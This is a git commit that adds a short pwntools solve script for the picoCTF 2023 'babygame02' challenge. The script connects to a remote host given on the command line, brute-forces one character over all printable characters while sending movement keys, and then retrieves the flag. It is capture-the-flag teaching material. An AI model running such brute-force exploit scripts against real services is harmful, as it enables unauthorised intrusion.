7bca9b7617a53fdd1619c4991c64237e4ce22da6
Mark Uche <113513376+markuched13@users.noreply.github.com>
2023-03-28 15:11:49 +0100

    Create babygame02.py

---
+++ solvescript/pico23/pwn/babygame02.py
@@ -0,0 +1,39 @@
+#!/usr/bin/python3
+#Author: Hack.You
+
+from pwn import *
+import sys
+import string
+import warnings
+
+warnings.filterwarnings('ignore')
+context.log_level = 'info'
+
+hostname = sys.argv[1]
+port = sys.argv[2]
+
+def brute():
+    for i in string.printable:
+        io = remote(f'{hostname}', f'{port}')
+        io.sendline('l'+i)
+        io.sendline(b'w'*4)
+        io.sendline(b'd'*47)
+        io.sendline(b'wp')
+        recv = io.recvall()
+        if b'picoCTF' in recv:
+            print(f'Remote offset found as {i}')
+            offset = i 
+            return offset
+            break
+
+def getflag(offset):
+    io = remote(f'{hostname}', f'{port}')
+    io.sendline('l'+offset)
+    io.sendline(b'w'*4)
+    io.sendline(b'd'*47)
+    io.sendline(b'wp')
+    flag = io.recvall()
+    success(flag)
+
+offset = brute()
+getflag(offset)
